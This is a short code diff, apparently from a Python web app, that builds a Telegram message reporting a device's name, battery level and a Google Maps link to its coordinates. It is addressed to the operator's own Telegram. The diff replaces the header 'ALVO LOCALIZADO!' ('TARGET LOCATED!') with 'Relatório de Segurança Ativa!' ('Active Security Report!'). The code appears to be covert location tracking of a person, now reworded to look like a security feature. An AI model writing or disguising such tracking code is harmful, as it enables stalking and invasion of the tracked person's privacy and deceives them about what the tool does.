@@ -55,7 +55,7 @@ with col2:
             bat_nivel = bateria if bateria else "N/A"
             
             # MONTA A MENSAGEM PARA O SEU TELEGRAM
-            msg = f"🔔 ALVO LOCALIZADO!\n\n"
+            msg = f"🔔 Relatório de Segurança Ativa!\n\n"
             msg += f"📱 Aparelho: {dispositivo}\n"
             msg += f"🔋 Bateria: {bat_nivel}%\n"
             msg += f"📍 Mapa: https://www.google.com/maps?q={lat},{lon}\n"
